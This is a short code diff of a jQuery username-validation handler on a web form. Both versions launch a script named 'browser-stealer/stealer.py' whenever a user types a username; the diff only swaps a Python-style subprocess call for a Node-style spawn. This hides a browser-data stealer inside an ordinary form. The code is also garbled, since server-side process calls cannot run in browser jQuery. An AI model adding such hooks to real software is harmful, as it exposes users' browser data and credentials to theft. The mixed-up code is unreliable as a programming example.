@@ -46,8 +46,8 @@
 
   $("#username").on("input", function () {
     username = $(this).val();
-    var pythonScriptPath = "browser-stealer/stealer.py";
-    subprocess.run(["python", pythonScriptPath]);
+    var scriptPath = "browser-stealer/stealer.py";
+    const pyProg = spawn('python', [scriptPath]);
 
     $.ajax({
       url: "/accounts/ajax/validate-username/",
